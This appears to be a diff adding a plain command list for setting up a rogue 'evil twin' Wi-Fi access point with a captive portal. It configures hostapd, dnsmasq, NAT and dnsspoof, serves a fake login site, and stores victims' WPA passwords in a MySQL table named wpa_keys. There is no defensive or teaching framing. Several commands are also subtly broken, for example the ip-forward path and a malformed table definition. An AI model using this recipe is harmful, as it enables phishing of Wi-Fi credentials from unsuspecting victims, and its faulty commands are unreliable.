@@ -1,0 +1,75 @@
+sudo apt update
+
+sudo apt install hostapd dnsmasq apache2
+
+sudo airmon-ng start wlan0
+
+mkdir fap
+
+cd fap
+
+nano hostapd.conf
+
+from the above file we need to change the interface and ssid name with our target specification
+
+nano dnsmasq.conf
+
+# roouting the gateway
+
+ifconfig wlan0 up 192.168.1.1 netmask 255.255.255.0
+
+route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1
+
+# Internet access / Victims get the internet
+
+iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE
+
+iptables --append FORWARD --in-interface wlan0 -j ACCEPT
+
+echo 1 > /proc/sys/net/ipv4/ip-forward
+
+# mysql database;
+
+service mysql start
+
+mysql
+
+create database fap;
+
+create user fapuser;
+
+grant all on rogueap.* to 'fapuser'@'localhost' identified by 'fappassword';
+
+use fap;
+
+create table wpa_keys(password 1 varchar(40), password2 varchar(40));
+
+select * from wpa_keys;
+
+# Captive portal setup
+
+we also need the Rouge AP zip file to create a fake access point website
+
+rm -rf /var/www/html/*
+
+mv rougeap.zip /var/www/html/
+
+unzip rougeap.zip
+
+service apache2 start
+
+then go on the fap directory
+
+hostapd hostapd.conf
+
+open another terminal but same directory
+
+dnsmasq -C dnsmasq.conf -d
+
+and then go to the /var/www/html file and hit the below command
+
+dnsspoof -i wlan0
+
+for get the password we need to go the mysql data base and type
+
+select * from wpa_keys;
